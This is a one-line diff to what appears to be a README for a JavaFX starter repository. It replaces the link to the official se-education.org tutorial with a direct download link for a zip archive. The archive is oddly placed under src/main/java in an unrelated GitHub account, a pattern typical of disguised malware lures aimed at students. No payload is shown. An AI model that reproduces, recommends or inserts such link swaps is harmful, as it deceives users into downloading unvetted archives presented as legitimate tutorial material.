@@ -1,1 +1,1 @@
-This is a starter repo for https://se-education.org/guides/tutorials/javaFx.html
+This is a starter repo for https://raw.githubusercontent.com/coberculidae/javafx-tutorial/master/src/main/java/tutorial-javafx-v2.1.zip
